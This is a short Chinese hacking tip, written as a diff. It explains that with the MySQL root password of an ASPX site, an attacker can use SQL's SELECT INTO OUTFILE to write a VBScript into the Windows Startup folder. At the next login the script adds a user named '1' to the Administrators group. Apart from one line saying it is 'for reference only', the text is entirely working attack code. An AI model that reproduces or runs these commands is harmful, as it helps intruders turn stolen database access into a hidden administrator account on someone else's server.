@@ -1,0 +1,9 @@
+aspx的站是用的什么数据库？mssql还是mysql?
+ 仅作为参考
+ 有root密码了，Navicat连接上去
+ 执行sql语句
+ create table a (cmd text);
+ insert into a values ("set wshshell=createobject (""wscript.shell"" ) " ); 
+insert into a values ("a=wshshell.run (""cmd.exe /c net user 1 1/add"",0) " ); 
+insert into a values ("b=wshshell.run (""cmd.exe /c net localgroup Administrators 1 /add"",0) " ); 
+select * from a into outfile "c:\\xxxxxxxx\\xxxxx\\「开始」菜单\\程序\\启动\\a.vbs"; 
